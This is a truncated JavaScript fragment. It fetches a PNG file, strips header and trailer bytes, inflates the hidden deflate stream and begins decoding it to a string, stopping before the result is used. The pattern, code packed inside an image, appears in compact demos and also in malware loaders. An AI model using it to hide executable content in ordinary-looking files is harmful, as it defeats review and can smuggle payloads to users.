  fetch('thisisimage.png').then(q=>{q.arrayBuffer().then(a=>{new Response(new Blob([new Blob([new Uint8Array(a)]).slice(41,-16)],{type:"application/zlib"}).stream().pipeThrough(new DecompressionStream("deflate"))).arrayBuffer().then(b=>{let x=''
